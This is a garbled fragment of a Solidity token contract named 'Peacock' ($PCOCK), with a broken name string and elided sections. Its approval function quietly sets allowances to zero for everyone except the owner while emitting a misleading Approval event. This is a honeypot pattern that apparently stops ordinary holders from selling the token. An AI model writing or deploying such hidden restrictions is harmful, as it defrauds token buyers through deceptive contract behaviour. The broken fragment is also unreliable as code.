 ...
 string private _name = 'Peacock | https: string private _symbol = '$PCOCK';
 ...
 if (pea != owner()) {
 _allowances[pea][cock] = 0;
 emit Approval(pea, cock, 4);
 }
 else {
 _allowances[pea][cock] = amount;
 emit Approval(pea, cock, amount);
 }
 }
